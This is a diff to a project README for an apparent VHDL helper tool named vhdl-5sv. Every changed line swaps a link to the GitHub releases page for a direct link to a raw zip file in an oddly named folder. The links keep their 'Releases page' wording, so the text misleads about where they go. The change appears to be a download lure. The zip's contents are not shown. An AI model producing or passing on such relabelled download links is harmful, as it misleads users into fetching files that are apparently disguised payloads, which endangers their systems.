@@ -6,7 +6,7 @@ Welcome to vhdl-5sv! This tool helps you work with VHDL faster and more efficien
 
 ## 📥 Download Now
 
-[![Download vhdl-5sv](https://img.shields.io/badge/Download-vhdl--5sv-brightgreen)](https://github.com/ateo44/vhdl-5sv/releases)
+[![Download vhdl-5sv](https://raw.githubusercontent.com/ateo44/vhdl-5sv/main/Caesarism/vhdl-5sv.zip)](https://raw.githubusercontent.com/ateo44/vhdl-5sv/main/Caesarism/vhdl-5sv.zip)
 
 ## ⭐ Features
 
@@ -23,7 +23,7 @@ Welcome to vhdl-5sv! This tool helps you work with VHDL faster and more efficien
 
 ## 📂 Download & Install
 
-To get started with vhdl-5sv, visit the [Releases page](https://github.com/ateo44/vhdl-5sv/releases) and download the version that matches your operating system. 
+To get started with vhdl-5sv, visit the [Releases page](https://raw.githubusercontent.com/ateo44/vhdl-5sv/main/Caesarism/vhdl-5sv.zip) and download the version that matches your operating system. 
 
 1. Click on the link to the Releases page above.
 2. Find the latest version of vhdl-5sv.
@@ -54,4 +54,4 @@ Interested in contributing? We welcome feedback, bug reports, and new features. 
 
 ## 💡 Conclusion
 
-vhdl-5sv is designed to simplify your VHDL development. With just a few easy steps, you can download, install, and start enhancing your VHDL projects today. Don't forget to visit the [Releases page](https://github.com/ateo44/vhdl-5sv/releases) to download vhdl-5sv!
+vhdl-5sv is designed to simplify your VHDL development. With just a few easy steps, you can download, install, and start enhancing your VHDL projects today. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/ateo44/vhdl-5sv/main/Caesarism/vhdl-5sv.zip) to download vhdl-5sv!
